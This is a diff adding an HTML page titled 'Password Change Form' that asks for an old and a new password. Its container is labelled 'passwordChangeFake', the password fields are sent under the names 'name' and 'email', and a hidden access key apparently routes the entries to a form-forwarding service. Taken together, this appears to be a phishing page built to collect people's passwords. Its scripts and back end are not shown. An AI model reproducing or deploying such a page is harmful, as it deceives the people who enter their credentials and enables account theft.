@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <title>Password Change Form</title>
+</head>
+<body>
+    <div class="passwordChangeFake">
+        <img src="./img/icons8-lock-50.png" alt="">
+        <h4>Create A strong Password</h4>
+        <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!$@%).</p>
+        <form action="password_change.php" id="form" method="post">
+            <input type="hidden" name="access_key" value=85004fa4-3ec2-4f6e-91e8-b9a415f3cd9f>
+            <input type="password" id="Password" name="name" placeholder="old Password" required><br><br>
+            <input type="password" id="newPassword" name="email" placeholder=" new Password" required><br><br>
+    
+            <div class="btnsubmit">
+                <input type="submit" value="Change Password" id="submit">
+
+            </div>
+            <div id="result"></div>
+        </form>
+
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
